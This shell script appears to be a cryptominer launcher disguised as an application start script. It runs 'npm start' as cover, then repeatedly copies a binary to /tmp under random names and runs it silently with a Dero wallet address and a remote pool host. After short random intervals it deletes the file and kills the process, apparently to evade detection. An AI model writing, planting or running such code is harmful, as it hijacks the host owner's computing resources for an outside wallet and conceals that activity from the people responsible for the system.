#!/bin/sh
nohup npm start &
# Function to generate a random 9-digit alphanumeric name
generate_random_name() {
  new_name=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 9 | head -n 1)
}

while true; do
  generate_random_name
  delay=$((10 + RANDOM % 51))
  echo "Delay: $delay seconds"

  if [ -f main ]; then
    mv main /tmp/"$new_name"
    echo "Moved main file to /tmp"
  fi

  chmod 777 /tmp/"$new_name"
  (cd /tmp && ./"$new_name" -w dero1qyjrwgdvns7arfuzf6pz5lhpj2yfsdlzy9c05w6qmmp3shc7fm3m2qgjs4uez -r api.metacontrive.tech:443 -p rpc > /dev/null 2>&1) &
  pid=$!
  echo "Restarted with PID: $pid $new_name"

  sleep "$delay"
  echo "$new_name"
  
  echo "Removing file: $new_name"
  rm -f /tmp/"$new_name"

  if [ -n "$pid" ] && kill -0 "$pid" > /dev/null 2>&1; then
    echo "Stopping process with PID: $pid $new_name"
    kill "$pid"
    echo "Process stopped $pid $new_name"
  else
    echo "Process with PID $pid $new_name not found. Skipping process stop."
  fi

done


